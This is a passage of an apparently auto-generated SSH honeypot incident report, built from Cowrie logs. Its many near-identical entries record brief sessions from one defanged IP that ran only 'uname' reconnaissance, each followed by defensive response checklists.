| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:58` | `cowrie.session.connect` |
| `2026-08-24 01:24:58` | `cowrie.client.version` |
| `2026-08-24 01:24:58` | `cowrie.client.kex` |
| `2026-08-24 01:24:59` | `cowrie.login.success` |
| `2026-08-24 01:25:00` | `cowrie.session.params` |
| `2026-08-24 01:25:00` | `cowrie.command.input` |
| `2026-08-24 01:25:00` | `cowrie.log.closed` |
| `2026-08-24 01:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b28398090d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:04` | `cowrie.session.connect` |
| `2026-08-24 01:25:04` | `cowrie.client.version` |
| `2026-08-24 01:25:04` | `cowrie.client.kex` |
| `2026-08-24 01:25:04` | `cowrie.login.success` |
| `2026-08-24 01:25:05` | `cowrie.session.params` |
| `2026-08-24 01:25:05` | `cowrie.command.input` |
| `2026-08-24 01:25:05` | `cowrie.log.closed` |
| `2026-08-24 01:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82611a486b09

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:09` | `cowrie.session.connect` |
| `2026-08-24 01:25:09` | `cowrie.client.version` |
| `2026-08-24 01:25:09` | `cowrie.client.kex` |
| `2026-08-24 01:25:10` | `cowrie.login.success` |
| `2026-08-24 01:25:10` | `cowrie.session.params` |
| `2026-08-24 01:25:10` | `cowrie.command.input` |
| `2026-08-24 01:25:11` | `cowrie.log.closed` |
| `2026-08-24 01:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca9e4306efa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:14` | `cowrie.session.connect` |
| `2026-08-24 01:25:14` | `cowrie.client.version` |
| `2026-08-24 01:25:14` | `cowrie.client.kex` |
| `2026-08-24 01:25:15` | `cowrie.login.success` |
| `2026-08-24 01:25:15` | `cowrie.session.params` |
| `2026-08-24 01:25:15` | `cowrie.command.input` |
| `2026-08-24 01:25:16` | `cowrie.log.closed` |
| `2026-08-24 01:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a98633b7f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:19` | `cowrie.session.connect` |
| `2026-08-24 01:25:19` | `cowrie.client.version` |
| `2026-08-24 01:25:19` | `cowrie.client.kex` |
| `2026-08-24 01:25:20` | `cowrie.login.success` |
| `2026-08-24 01:25:21` | `cowrie.session.params` |
| `2026-08-24 01:25:21` | `cowrie.command.input` |
| `2026-08-24 01:25:21` | `cowrie.log.closed` |
| `2026-08-24 01:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-464d5aca2922

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:30` | `cowrie.session.connect` |
| `2026-08-24 01:25:30` | `cowrie.client.version` |
| `2026-08-24 01:25:30` | `cowrie.client.kex` |
| `2026-08-24 01:25:30` | `cowrie.login.success` |
| `2026-08-24 01:25:31` | `cowrie.session.params` |
| `2026-08-24 01:25:31` | `cowrie.command.input` |
| `2026-08-24 01:25:31` | `cowrie.log.closed` |
| `2026-08-24 01:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e2dd30fddc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:35` | `cowrie.session.connect` |
| `2026-08-24 01:25:35` | `cowrie.client.version` |
| `2026-08-24 01:25:35` | `cowrie.client.kex` |
| `2026-08-24 01:25:36` | `cowrie.login.success` |
| `2026-08-24 01:25:36` | `cowrie.session.params` |
| `2026-08-24 01:25:36` | `cowrie.command.input` |
| `2026-08-24 01:25:36` | `cowrie.log.closed` |
| `2026-08-24 01:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9dd4c43cd27

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:40` | `cowrie.session.connect` |
| `2026-08-24 01:25:40` | `cowrie.client.version` |
| `2026-08-24 01:25:40` | `cowrie.client.kex` |
| `2026-08-24 01:25:41` | `cowrie.login.success` |
| `2026-08-24 01:25:42` | `cowrie.session.params` |
| `2026-08-24 01:25:42` | `cowrie.command.input` |
| `2026-08-24 01:25:42` | `cowrie.log.closed` |
| `2026-08-24 01:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ffaca845b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:46` | `cowrie.session.connect` |
| `2026-08-24 01:25:46` | `cowrie.client.version` |
| `2026-08-24 01:25:46` | `cowrie.client.kex` |
| `2026-08-24 01:25:46` | `cowrie.login.success` |
| `2026-08-24 01:25:47` | `cowrie.session.params` |
| `2026-08-24 01:25:47` | `cowrie.command.input` |
| `2026-08-24 01:25:47` | `cowrie.log.closed` |
| `2026-08-24 01:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab2c6292c4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:51` | `cowrie.session.connect` |
| `2026-08-24 01:25:51` | `cowrie.client.version` |
| `2026-08-24 01:25:51` | `cowrie.client.kex` |
| `2026-08-24 01:25:51` | `cowrie.login.success` |
| `2026-08-24 01:25:52` | `cowrie.session.params` |
| `2026-08-24 01:25:52` | `cowrie.command.input` |
| `2026-08-24 01:25:52` | `cowrie.log.closed` |
| `2026-08-24 01:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60ab2d792a70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:25 |
| **Last Seen** | 2026-08-24 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:25:56` | `cowrie.session.connect` |
| `2026-08-24 01:25:56` | `cowrie.client.version` |
| `2026-08-24 01:25:56` | `cowrie.client.kex` |
| `2026-08-24 01:25:56` | `cowrie.login.success` |
| `2026-08-24 01:25:57` | `cowrie.session.params` |
| `2026-08-24 01:25:57` | `cowrie.command.input` |
| `2026-08-24 01:25:57` | `cowrie.log.closed` |
| `2026-08-24 01:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb4b8696613

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:01` | `cowrie.session.connect` |
| `2026-08-24 01:26:01` | `cowrie.client.version` |
| `2026-08-24 01:26:01` | `cowrie.client.kex` |
| `2026-08-24 01:26:02` | `cowrie.login.success` |
| `2026-08-24 01:26:03` | `cowrie.session.params` |
| `2026-08-24 01:26:03` | `cowrie.command.input` |
| `2026-08-24 01:26:03` | `cowrie.log.closed` |
| `2026-08-24 01:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7298befa54eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:06` | `cowrie.session.connect` |
| `2026-08-24 01:26:06` | `cowrie.client.version` |
| `2026-08-24 01:26:06` | `cowrie.client.kex` |
| `2026-08-24 01:26:07` | `cowrie.login.success` |
| `2026-08-24 01:26:08` | `cowrie.session.params` |
| `2026-08-24 01:26:08` | `cowrie.command.input` |
| `2026-08-24 01:26:08` | `cowrie.log.closed` |
| `2026-08-24 01:26:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1444f6bd8b12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:12` | `cowrie.session.connect` |
| `2026-08-24 01:26:12` | `cowrie.client.version` |
| `2026-08-24 01:26:12` | `cowrie.client.kex` |
| `2026-08-24 01:26:12` | `cowrie.login.success` |
| `2026-08-24 01:26:13` | `cowrie.session.params` |
| `2026-08-24 01:26:13` | `cowrie.command.input` |
| `2026-08-24 01:26:13` | `cowrie.log.closed` |
| `2026-08-24 01:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517cc9ba0736

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:17` | `cowrie.session.connect` |
| `2026-08-24 01:26:17` | `cowrie.client.version` |
| `2026-08-24 01:26:17` | `cowrie.client.kex` |
| `2026-08-24 01:26:17` | `cowrie.login.success` |
| `2026-08-24 01:26:18` | `cowrie.session.params` |
| `2026-08-24 01:26:18` | `cowrie.command.input` |
| `2026-08-24 01:26:18` | `cowrie.log.closed` |
| `2026-08-24 01:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c519f644dabe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:22` | `cowrie.session.connect` |
| `2026-08-24 01:26:22` | `cowrie.client.version` |
| `2026-08-24 01:26:23` | `cowrie.client.kex` |
| `2026-08-24 01:26:23` | `cowrie.login.success` |
| `2026-08-24 01:26:24` | `cowrie.session.params` |
| `2026-08-24 01:26:24` | `cowrie.command.input` |
| `2026-08-24 01:26:24` | `cowrie.log.closed` |
| `2026-08-24 01:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0da1e046e62d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:27` | `cowrie.session.connect` |
| `2026-08-24 01:26:27` | `cowrie.client.version` |
| `2026-08-24 01:26:27` | `cowrie.client.kex` |
| `2026-08-24 01:26:28` | `cowrie.login.success` |
| `2026-08-24 01:26:29` | `cowrie.session.params` |
| `2026-08-24 01:26:29` | `cowrie.command.input` |
| `2026-08-24 01:26:29` | `cowrie.log.closed` |
| `2026-08-24 01:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ea3b579567

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:33` | `cowrie.session.connect` |
| `2026-08-24 01:26:33` | `cowrie.client.version` |
| `2026-08-24 01:26:33` | `cowrie.client.kex` |
| `2026-08-24 01:26:33` | `cowrie.login.success` |
| `2026-08-24 01:26:34` | `cowrie.session.params` |
| `2026-08-24 01:26:34` | `cowrie.command.input` |
| `2026-08-24 01:26:34` | `cowrie.log.closed` |
| `2026-08-24 01:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4d2b61d632a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:38` | `cowrie.session.connect` |
| `2026-08-24 01:26:38` | `cowrie.client.version` |
| `2026-08-24 01:26:38` | `cowrie.client.kex` |
| `2026-08-24 01:26:38` | `cowrie.login.success` |
| `2026-08-24 01:26:39` | `cowrie.session.params` |
| `2026-08-24 01:26:39` | `cowrie.command.input` |
| `2026-08-24 01:26:39` | `cowrie.log.closed` |
| `2026-08-24 01:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f56709cb4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:43` | `cowrie.session.connect` |
| `2026-08-24 01:26:43` | `cowrie.client.version` |
| `2026-08-24 01:26:43` | `cowrie.client.kex` |
| `2026-08-24 01:26:43` | `cowrie.login.success` |
| `2026-08-24 01:26:44` | `cowrie.session.params` |
| `2026-08-24 01:26:44` | `cowrie.command.input` |
| `2026-08-24 01:26:45` | `cowrie.log.closed` |
| `2026-08-24 01:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8557f0e6fa31

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:48` | `cowrie.session.connect` |
| `2026-08-24 01:26:48` | `cowrie.client.version` |
| `2026-08-24 01:26:48` | `cowrie.client.kex` |
| `2026-08-24 01:26:49` | `cowrie.login.success` |
| `2026-08-24 01:26:50` | `cowrie.session.params` |
| `2026-08-24 01:26:50` | `cowrie.command.input` |
| `2026-08-24 01:26:50` | `cowrie.log.closed` |
| `2026-08-24 01:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-514e2f5e0cfb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:54` | `cowrie.session.connect` |
| `2026-08-24 01:26:54` | `cowrie.client.version` |
| `2026-08-24 01:26:54` | `cowrie.client.kex` |
| `2026-08-24 01:26:54` | `cowrie.login.success` |
| `2026-08-24 01:26:55` | `cowrie.session.params` |
| `2026-08-24 01:26:55` | `cowrie.command.input` |
| `2026-08-24 01:26:55` | `cowrie.log.closed` |
| `2026-08-24 01:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-646570c2442c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:26 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:26:59` | `cowrie.session.connect` |
| `2026-08-24 01:26:59` | `cowrie.client.version` |
| `2026-08-24 01:26:59` | `cowrie.client.kex` |
| `2026-08-24 01:27:00` | `cowrie.login.success` |
| `2026-08-24 01:27:00` | `cowrie.session.params` |
| `2026-08-24 01:27:00` | `cowrie.command.input` |
| `2026-08-24 01:27:01` | `cowrie.log.closed` |
| `2026-08-24 01:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-973007991d9c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:04` | `cowrie.session.connect` |
| `2026-08-24 01:27:04` | `cowrie.client.version` |
| `2026-08-24 01:27:04` | `cowrie.client.kex` |
| `2026-08-24 01:27:05` | `cowrie.login.success` |
| `2026-08-24 01:27:06` | `cowrie.session.params` |
| `2026-08-24 01:27:06` | `cowrie.command.input` |
| `2026-08-24 01:27:06` | `cowrie.log.closed` |
| `2026-08-24 01:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-352e652ccb52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:10` | `cowrie.session.connect` |
| `2026-08-24 01:27:10` | `cowrie.client.version` |
| `2026-08-24 01:27:10` | `cowrie.client.kex` |
| `2026-08-24 01:27:10` | `cowrie.login.success` |
| `2026-08-24 01:27:11` | `cowrie.session.params` |
| `2026-08-24 01:27:11` | `cowrie.command.input` |
| `2026-08-24 01:27:11` | `cowrie.log.closed` |
| `2026-08-24 01:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4016b5bc01

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:15` | `cowrie.session.connect` |
| `2026-08-24 01:27:15` | `cowrie.client.version` |
| `2026-08-24 01:27:15` | `cowrie.client.kex` |
| `2026-08-24 01:27:15` | `cowrie.login.success` |
| `2026-08-24 01:27:16` | `cowrie.session.params` |
| `2026-08-24 01:27:16` | `cowrie.command.input` |
| `2026-08-24 01:27:16` | `cowrie.log.closed` |
| `2026-08-24 01:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
